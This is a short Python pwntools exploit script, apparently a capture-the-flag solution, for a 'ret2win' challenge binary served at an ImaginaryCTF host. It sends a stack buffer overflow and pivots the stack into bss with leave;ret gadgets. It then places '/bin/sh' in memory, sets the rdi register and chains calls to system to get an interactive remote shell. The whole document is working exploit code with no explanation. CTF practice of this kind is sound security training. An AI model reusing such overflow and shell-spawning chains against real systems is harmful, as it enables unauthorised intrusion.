#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./vuln")


def start(argv=[], *a, **kw):
    host = args.HOST or 'ret2win.chal.imaginaryctf.org'
    port = int(args.PORT or 1337)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

pad = 0x40
win = elf.symbols["win"]
main = elf.symbols["main"]
leave_ret = main + 34

mov_rdi = 0x4010b0
system = win + 15

payload = b"A" * pad + p64(0x404078)
payload += flat(leave_ret + 1, main + 8)

io.sendline(payload)

payload = b"/bin/sh\x00" + b"A" * (pad - 0x8) + p64(elf.bss(0xe08))
payload += flat(mov_rdi)
payload += flat(leave_ret)
for i in range(0x1d0):
    payload += flat(system)
io.sendline(payload)

io.interactive()
